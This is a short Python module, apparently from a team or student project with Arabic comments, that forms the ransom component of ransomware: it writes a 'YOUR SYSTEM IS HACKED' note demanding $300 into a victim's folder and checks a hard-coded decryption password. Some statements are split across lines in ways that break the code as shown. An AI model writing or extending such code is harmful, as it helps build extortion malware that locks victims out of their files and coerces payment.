
import os
import datetime

# ============================================================
# Developer: Doaa (Team Leader)
# Module: Attack Logic & Security Verification
# ============================================================

class AttackManager:
    def __init__(self):
        self.password =

"money2024" # كلمة السر التي حددتها القائدة
        self.note_name = "READ_ME_NOW.txt"

    def create_ransom_note(self, folder_path):
        """
        وظيفة دعاء: إنشاء رسالة التهديد التي تظهر للضحية
        """
        note_path = os.path.join(folder_path, self.note_name)
        try:
            with open(note_path, "w") as f:
                f.write("!!! YOUR

SYSTEM IS HACKED !!!\n")
                f.write("--------------------------------\n")
                f.write(f"Attack Date: {datetime.datetime.now()}\n")
                f.write("To decrypt your files, you must pay $300.\n")
                f.write("Password required for decryption tool.\n")
        except Exception as e:
            print(f"Error creating note: {e}")

    def verify_password(self, input_password):
        """
        وظيفة دعاء: نظام الحماية للتحقق من

الدفع
        """
        if input_password == self.password:
            return True # تم الدفع بنجاح
        else:
            return False # محاولة فاشلة
